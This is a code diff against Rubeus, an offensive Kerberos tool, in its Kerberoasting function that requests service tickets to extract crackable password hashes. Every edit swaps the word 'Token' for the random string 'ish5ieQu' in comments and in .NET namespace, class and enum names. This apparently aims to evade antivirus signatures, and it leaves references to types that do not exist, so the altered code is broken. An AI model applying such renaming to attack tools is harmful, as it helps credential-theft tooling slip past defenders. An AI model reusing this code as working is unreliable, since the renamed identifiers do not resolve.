@@ -290,7 +290,7 @@ namespace Rubeus
                 }
                 else
                 {
-                    // otherwise use the KerberosRequestorSecurityToken method
+                    // otherwise use the KerberosRequestorSecurityish5ieQu method
                     GetTGSRepHash(spn, "USER", "DISTINGUISHEDNAME", cred, outFile);
                 }
             }
@@ -308,7 +308,7 @@ namespace Rubeus
                     }
                     else
                     {
-                        // otherwise use the KerberosRequestorSecurityToken method
+                        // otherwise use the KerberosRequestorSecurityish5ieQu method
                         GetTGSRepHash(s, "USER", "DISTINGUISHEDNAME", cred, outFile);
                     }
                 }
@@ -650,7 +650,7 @@ namespace Rubeus
                             }
                             else
                             {
-                                // otherwise use the KerberosRequestorSecurityToken method
+                                // otherwise use the KerberosRequestorSecurityish5ieQu method
                                 GetTGSRepHash(servicePrincipalName, samAccountName, distinguishedName, cred, outFile, simpleOutput);
                             }
                         }
@@ -691,7 +691,7 @@ namespace Rubeus
 
         public static void GetTGSRepHash(string spn, string userName = "user", string distinguishedName = "", System.Net.NetworkCredential cred = null, string outFile = "", bool simpleOutput = false)
         {
-            // use the System.IdentityModel.Tokens.KerberosRequestorSecurityToken approach
+            // use the System.IdentityModel.ish5ieQus.KerberosRequestorSecurityish5ieQu approach
 
             string domain = "DOMAIN";
 
@@ -705,16 +705,16 @@ namespace Rubeus
 
             try
             {
-                // the System.IdentityModel.Tokens.KerberosRequestorSecurityToken approach and extraction of the AP-REQ from the
+                // the System.IdentityModel.ish5ieQus.KerberosRequestorSecurityish5ieQu approach and extraction of the AP-REQ from the
                 //  GetRequest() stream was constributed to PowerView by @machosec
-                System.IdentityModel.Tokens.KerberosRequestorSecurityToken ticket;
+                System.IdentityModel.ish5ieQus.KerberosRequestorSecurityish5ieQu ticket;
                 if (cred != null)
                 {
-                    ticket = new System.IdentityModel.Tokens.KerberosRequestorSecurityToken(spn, TokenImpersonationLevel.Impersonation, cred, Guid.NewGuid().ToString());
+                    ticket = new System.IdentityModel.ish5ieQus.KerberosRequestorSecurityish5ieQu(spn, ish5ieQuImpersonationLevel.Impersonation, cred, Guid.NewGuid().ToString());
                 }
                 else
                 {
-                    ticket = new System.IdentityModel.Tokens.KerberosRequestorSecurityToken(spn);
+                    ticket = new System.IdentityModel.ish5ieQus.KerberosRequestorSecurityish5ieQu(spn);
                 }
                 byte[] requestBytes = ticket.GetRequest();
 
@@ -827,7 +827,7 @@ namespace Rubeus
 
         public static bool GetTGSRepHash(KRB_CRED TGT, string spn, string userName = "user", string distinguishedName = "", string outFile = "", bool simpleOutput = false, bool enterprise = false, string domainController = "", Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial)
         {
-            // use a TGT blob to request a hash instead of the KerberosRequestorSecurityToken method
+            // use a TGT blob to request a hash instead of the KerberosRequestorSecurityish5ieQu method
             string userDomain = "DOMAIN";
 
             if (Regex.IsMatch(distinguishedName, "^CN=.*", RegexOptions.IgnoreCase))
